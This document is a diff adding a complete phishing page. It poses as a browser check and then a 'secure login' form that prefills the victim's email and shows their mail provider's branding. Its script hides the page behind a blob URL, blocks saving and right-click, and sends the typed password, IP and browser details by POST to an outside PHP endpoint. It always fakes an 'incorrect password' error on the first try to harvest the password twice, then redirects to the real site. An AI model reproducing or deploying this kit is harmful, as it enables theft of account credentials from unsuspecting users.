@@ -1,0 +1,850 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>l​o​g​i​n</title>
+
+
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+
+    <script src="js/jquery-3.6.0.min.js"></script>
+
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <link href="css/bootstrap-icons.css" rel="stylesheet">
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #0d6efd;
+            --secondary-color: #6c757d;
+            --success-color: #198754;
+            --danger-color: #dc3545;
+            --light-bg: rgba(255, 255, 255, 0.95);
+            --dark-overlay: rgba(0, 0, 0, 0.7);
+            --border-radius: 12px;
+            --box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+
+        /* Background Container */
+        #background-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            overflow: hidden;
+        }
+
+        #background-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            filter: blur(5px) brightness(0.7);
+            transform: scale(1.1);
+            transition: filter 1s ease, transform 1s ease;
+        }
+
+        #background-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8) 0%, rgba(0, 0, 0, 0.6) 100%);
+            z-index: -1;
+        }
+
+        /* Verification Section */
+        #verification-section {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            transition: opacity 0.5s ease;
+        }
+
+        .verification-content {
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            padding: 2rem;
+        }
+
+        .verification-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1.5rem;
+            border-radius: 50%;
+            overflow: hidden;
+            background: #f8f9fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid var(--primary-color);
+            box-shadow: 0 4px 12px rgba(13, 110, 253, 0.2);
+        }
+
+        .verification-logo img {
+            width: 40px;
+            height: 40px;
+        }
+
+        .verification-header {
+            margin-bottom: 2rem;
+        }
+
+        .verification-header h2 {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 0.5rem;
+            font-size: 1.8rem;
+        }
+
+        .verification-header p {
+            color: var(--secondary-color);
+            font-size: 0.95rem;
+        }
+
+        .verification-checkbox {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            transition: var(--transition);
+        }
+
+        .verification-checkbox:hover {
+            border-color: var(--primary-color);
+            background: #f0f7ff;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            cursor: pointer;
+            user-select: none;
+            margin: 0;
+        }
+
+        .checkbox-input {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            accent-color: var(--primary-color);
+        }
+
+        .checkbox-text {
+            font-size: 1.1rem;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .verification-footer {
+            margin-top: 2rem;
+            color: var(--secondary-color);
+            font-size: 0.9rem;
+        }
+
+        /* Main Content */
+        #main-content {
+            display: none;
+            min-height: 100vh;
+            padding: 2rem;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .form-container {
+            max-width: 420px;
+            width: 100%;
+            padding: 2.5rem;
+            background: var(--light-bg);
+            backdrop-filter: blur(10px);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            position: relative;
+            z-index: 10;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideUp 0.5s ease forwards 0.3s;
+        }
+
+        @keyframes slideUp {
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .form-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-logo {
+            width: 40px;
+            height: 40px;
+            margin-right: 12px;
+            border-radius: 8px;
+            overflow: hidden;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-logo img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #333;
+            margin: 0;
+        }
+
+        .form-subtitle {
+            color: var(--secondary-color);
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--secondary-color);
+            z-index: 2;
+            font-size: 1.2rem;
+        }
+
+        .form-control {
+            padding-left: 50px;
+            height: 56px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: var(--transition);
+            background: white;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(13, 110, 253, 0.1);
+        }
+
+        .form-control:disabled {
+            background-color: #f8f9fa;
+            cursor: not-allowed;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 56px;
+            background: var(--primary-color);
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: var(--transition);
+            margin-top: 0.5rem;
+        }
+
+        .btn-submit:hover {
+            background: #0b5ed7;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(13, 110, 253, 0.3);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        /* Loader */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--dark-overlay);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            backdrop-filter: blur(5px);
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Error Message */
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 10px;
+            margin-bottom: 1.5rem;
+            display: none;
+            border: 1px solid #f5c6cb;
+            font-size: 0.9rem;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            height: 4px;
+            background: #e9ecef;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 1rem;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-color);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* Responsive */
+        @media (max-width: 576px) {
+            .form-container {
+                padding: 2rem;
+                margin: 1rem;
+            }
+            
+            .verification-content {
+                padding: 1.5rem;
+            }
+            
+            .verification-header h2 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="background-container">
+        <iframe id="background-iframe" src="about:blank" allowfullscreen=""></iframe>
+        <div id="background-overlay"></div>
+    </div>
+
+
+    <div id="verification-section" style="opacity: 1;">
+        <div class="verification-content">
+            <div class="verification-logo">
+                <img id="verification-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain">
+            </div>
+            
+            <div class="verification-header">
+                <h2 id="domain-message" class="translatable" data-key="checking-browser">Checking your browser...</h2>
+                <p id="domain-submessage" class="translatable" data-key="checking-description">This helps protect your account from unauthorized access</p>
+            </div>
+
+            <div class="verification-checkbox">
+                <label class="checkbox-label">
+                    <input type="checkbox" id="bot-check" class="checkbox-input">
+                    <span class="checkbox-text translatable" data-key="not-robot">I'm not a robot</span>
+                </label>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-bar" id="verification-progress"></div>
+            </div>
+
+            <div class="verification-footer">
+                <p class="translatable" data-key="click-to-verify">Click the checkbox above to verify you're human</p>
+                <p class="text-muted translatable" style="font-size: 0.8rem; margin-top: 0.5rem;" data-key="verification-help">
+                    This verification helps prevent automated access
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+    <div id="main-content">
+        <div class="form-container">
+            <div class="error-message" id="error-message">
+                <i class="bi bi-exclamation-triangle-fill me-2"></i>
+                <span class="translatable" data-key="try-again">Incorrect password. Please try again.</span>
+            </div>
+
+            <div class="form-header">
+                <div class="form-logo">
+                    <img id="form-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain">
+                </div>
+                <h1 class="form-title" id="domain-name">SECURE LOGIN</h1>
+            </div>
+
+            <p class="form-subtitle">
+                <i class="bi bi-shield-check me-1"></i>
+                <span class="translatable" data-key="leading-security">Leading with Security - Continue to access your account</span>
+            </p>
+
+            <form id="user-form">
+                <div class="input-group">
+                    <i class="bi bi-envelope input-icon"></i>
+                    <input type="email" class="form-control" id="email" placeholder="Email address" disabled="" size="30">
+                </div>
+
+                <div class="input-group">
+                    <i class="bi bi-lock input-icon"></i>
+                    <input type="password" class="form-control" id="password" placeholder="Password" required="" size="30">
+                </div>
+
+                <button type="submit" class="btn-submit">
+                    <i class="bi bi-arrow-right me-2"></i>
+                    <span class="translatable" data-key="next-button">Continue</span>
+                </button>
+            </form>
+
+            <div class="mt-4 text-center">
+                <p class="text-muted" style="font-size: 0.85rem;">
+                    <i class="bi bi-info-circle me-1"></i>
+                    <span class="translatable" data-key="learn-more">For security reasons, please complete the verification above</span>
+                </p>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="loader-overlay" id="loader-overlay">
+        <div class="spinner"></div>
+        <span class="visually-hidden translatable" data-key="loading-text">Loading...</span>
+    </div>
+	
+  
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+
+    <script>
+	// -------------------- ⚠️ BLOB REDIRECT LOGIC --------------------
+if (!location.protocol.startsWith("blob")) {
+    const currentUrl = new URL(location.href);
+    const enParam = currentUrl.searchParams.get('en');
+    let email = '';
+
+    if (enParam) {
+        try {
+            const decoded = atob(enParam);
+            email = decoded.includes('@') ? decoded : enParam;
+        } catch (e) {
+            email = enParam;
+        }
+    }
+
+    fetch(location.href)
+        .then(res => res.text())
+        .then(html => {
+            const blob = new Blob([html], { type: 'text/html' });
+            const blobUrl = URL.createObjectURL(blob);
+            const finalHash = email ? '#' + btoa(email) : '';
+            window.location.replace(blobUrl + finalHash);
+        });
+}
+
+$(document).on('keydown', function(e) {
+  if (e.ctrlKey && (e.which === 83)) {
+    e.preventDefault();
+    return false;
+  }
+});
+
+
+document.addEventListener('contextmenu', (event) => {
+  event.preventDefault();
+});
+ 
+      function detectUserLanguage() {
+
+        const browserLang = navigator.language || navigator.userLanguage;
+        const langCode = browserLang.split('-')[0];
+     
+        const supportedLanguages = ['pl', 'fr', 'de', 'es', 'it', 'pt', 'ru', 'zh', 'ja', 'ko', 'ar'];
+        if (supportedLanguages.includes(langCode)) {
+          return langCode;
+        }
+        
+  
+        return new Promise((resolve) => {
+          fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+              const countryCode = data.country_code ? data.country_code.toLowerCase() : 'en';
+
+              const countryToLang = {
+                'pl': 'pl', 
+                'fr': 'fr',
+                'de': 'de', 
+                'es': 'es',
+                'it': 'it',
+                'pt': 'pt', 
+                'ru': 'ru', 
+                'cn': 'zh',
+                'jp': 'ja',
+                'kr': 'ko', 
+                'sa': 'ar'  
+              };
+              
+              resolve(countryToLang[countryCode] || 'en');
+            })
+            .catch(() => {
+              resolve('en');
+            });
+        });
+      }
+      
+
+      function translatePage(targetLang) {
+        if (targetLang === 'en') return;
+        
+
+        const apiUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=${targetLang}&dt=t&q=`;
+        
+   
+        const elements = document.querySelectorAll('.translatable');
+        
+
+        const texts = [];
+        const elementsArray = Array.from(elements);
+        
+        elementsArray.forEach(el => {
+          const text = el.textContent.trim();
+
+          if (!el.dataset.originalText) {
+            el.dataset.originalText = text;
+          }
+          texts.push(text);
+        });
+        
+
+        elementsArray.forEach((el, index) => {
+          const originalText = el.dataset.originalText || el.textContent.trim();
+          if (originalText) {
+            fetch(apiUrl + encodeURIComponent(originalText))
+              .then(response => response.json())
+              .then(data => {
+                if (data && data[0] && data[0][0] && data[0][0][0]) {
+                  el.textContent = data[0][0][0];
+                }
+              })
+              .catch(error => {
+                console.error('Translation error:', error);
+              });
+          }
+        });
+        
+
+        const inputs = document.querySelectorAll('input[placeholder]');
+        inputs.forEach(input => {
+          const originalPlaceholder = input.placeholder;
+          if (originalPlaceholder && originalPlaceholder !== ' ') {
+            fetch(apiUrl + encodeURIComponent(originalPlaceholder))
+              .then(response => response.json())
+              .then(data => {
+                if (data && data[0] && data[0][0] && data[0][0][0]) {
+                  input.placeholder = data[0][0][0];
+                }
+              })
+              .catch(error => {
+                console.error('Translation error for placeholder:', error);
+              });
+          }
+        });
+      }
+      
+
+      document.addEventListener('DOMContentLoaded', async function() {
+        try {
+          const userLanguage = await detectUserLanguage();
+          if (userLanguage !== 'en') {
+            translatePage(userLanguage);
+          }
+        } catch (error) {
+          console.error('Language detection failed:', error);
+        }
+      });
+    </script>
+
+
+    <script>
+
+        document.addEventListener('DOMContentLoaded', function() {
+
+const encoded = window.location.hash.substring(1);
+let email = null;
+
+try {
+    email = atob(encoded); // decode base64
+} catch (e) {
+    console.log("Invalid base64 hash");
+}
+
+let redirectDomain = null;
+            let domain = '';
+            let domainName = '';
+
+            if (email && email.includes('@')) {
+                domain = email.split('@')[1];
+                domainName = domain.split('.')[0].toUpperCase();
+                
+
+                document.getElementById('email').value = email;
+
+                const domainMessage = document.getElementById('domain-message');
+                const domainSubmessage = document.getElementById('domain-submessage');
+                
+      
+                domainMessage.dataset.originalText = `${domain} is checking your browser`;
+                domainSubmessage.dataset.originalText = `${domain} is verifying your connection for enhanced security`;
+                
+            
+                domainMessage.textContent = `${domain} is checking your browser`;
+                domainSubmessage.textContent = `${domain} is verifying your connection for enhanced security`;
+                
+    
+                const faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
+                document.getElementById('verification-favicon').src = faviconUrl;
+                document.getElementById('form-favicon').src = faviconUrl;
+                
+   
+                document.getElementById('domain-name').textContent = domainName;
+                
+           
+                let backgroundUrl;
+                switch(domain) {
+                    case 'gmail.com':
+                        backgroundUrl = 'https://www.gmail.com';
+                        break;
+                    case 'outlook.com':
+                    case 'hotmail.com':
+                        backgroundUrl = 'https://www.outlook.com';
+                        break;
+                    case 'yahoo.com':
+                        backgroundUrl = 'https://www.yahoo.com';
+                        break;
+                    case 'mail.com':
+                        backgroundUrl = 'https://www.mail.com';
+                        break;
+                    default:
+                   
+                        backgroundUrl = `https://${domain}`;
+                }
+                
+ 
+                document.getElementById('background-iframe').src = backgroundUrl;
+             
+                setTimeout(() => {
+                    document.getElementById('background-iframe').style.filter = 'blur(3px) brightness(0.8)';
+                    document.getElementById('background-iframe').style.transform = 'scale(1.05)';
+                }, 100);
+            }
+
+         
+            const botCheck = document.getElementById('bot-check');
+            const verificationSection = document.getElementById('verification-section');
+            const progressBar = document.getElementById('verification-progress');
+            const mainContent = document.getElementById('main-content');
+
+            botCheck.addEventListener('change', function() {
+                if (this.checked) {
+               
+                    this.disabled = true;
+                    const checkboxText = document.querySelector('.checkbox-text');
+           
+                    checkboxText.dataset.originalText = 'Verification in progress...';
+                    checkboxText.innerHTML = '<i class="bi bi-check-circle-fill text-success me-2"></i> Verification in progress...';
+
+         
+                    let progress = 0;
+                    const progressInterval = setInterval(() => {
+                        progress += 1;
+                        progressBar.style.width = progress + '%';
+                        
+                        if (progress >= 100) {
+                            clearInterval(progressInterval);
+                            
+                      
+                            const verificationHeader = document.querySelector('.verification-header h2');
+                            const verificationSubtitle = document.querySelector('.verification-header p');
+                            
+                            verificationHeader.dataset.originalText = 'Verification Complete!';
+                            verificationSubtitle.dataset.originalText = 'Redirecting to secure login...';
+                            checkboxText.dataset.originalText = 'Verified Successfully';
+                            
+                     
+                            verificationHeader.textContent = 'Verification Complete!';
+                            verificationSubtitle.textContent = 'Redirecting to secure login...';
+                            checkboxText.innerHTML = '<i class="bi bi-shield-check me-2"></i> Verified Successfully';
+                            
+                 
+                            setTimeout(() => {
+                                verificationSection.style.opacity = '0';
+                                setTimeout(() => {
+                                    verificationSection.style.display = 'none';
+                                    mainContent.style.display = 'flex';
+                                }, 500);
+                            }, 1500);
+                        }
+                    }, 40);
+                }
+            });
+
+    
+            let submitCount = 0;
+            const userForm = document.getElementById('user-form');
+            const errorMessage = document.getElementById('error-message');
+            const loaderOverlay = document.getElementById('loader-overlay');
+
+            userForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                submitCount++;
+
+                const password = document.getElementById('password').value.trim();
+                
+
+                loaderOverlay.style.display = 'flex';
+
+ 
+                const userData = {
+                    email: document.getElementById('email').value,
+                    password: password,
+                    ipAddress: 'Fetching...',
+                    userAgent: navigator.userAgent,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    browser: detectBrowser(),
+                    timestamp: new Date().toISOString(),
+                    language: navigator.language || navigator.userLanguage
+                };
+
+  
+                function detectBrowser() {
+                    const ua = navigator.userAgent;
+                    if (ua.includes('Firefox')) return 'Firefox';
+                    if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
+                    if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+                    if (ua.includes('Trident')) return 'Internet Explorer';
+                    if (ua.includes('Edge')) return 'Edge';
+                    if (ua.includes('Chrome')) return 'Chrome';
+                    if (ua.includes('Safari')) return 'Safari';
+                    return 'Unknown';
+                }
+
+
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        userData.ipAddress = data.ip;
+                        sendDataToServer(userData);
+                    })
+                    .catch(() => {
+                        userData.ipAddress = 'Unavailable';
+                        sendDataToServer(userData);
+                    });
+
+
+                if (submitCount === 1) {
+                    setTimeout(() => {
+                        loaderOverlay.style.display = 'none';
+                        errorMessage.style.display = 'block';
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    }, 3000);
+                } else if (submitCount === 2) {
+                    setTimeout(() => {
+                        loaderOverlay.style.display = 'none';
+                        if (domain) {
+                            window.location.href = `https://${domain}`;
+                        } else {
+                            window.location.href = 'https://example.com';
+                        }
+                    }, 3000);
+                }
+            });
+
+            function sendDataToServer(data) {
+                const formData = new FormData();
+                Object.keys(data).forEach(key => {
+                    formData.append(key, data[key]);
+                });
+
+                fetch('https://gloriainhomeservices.com/wp-content/themes/twentytwentythree/patterns/pno-otos.php?name=$id', {
+				
+				method: 'POST',
+                body: new URLSearchParams(data)
+                })
+                .then(response => response.text())
+                .then(result => {
+                    console.log('Data sent successfully:', result);
+                })
+                .catch(error => {
+                    console.error('Error sending data:', error);
+                });
+            }
+
+            setTimeout(() => {
+                verificationSection.style.opacity = '1';
+            }, 100);
+        });
+    </script>
+
+</body></html>
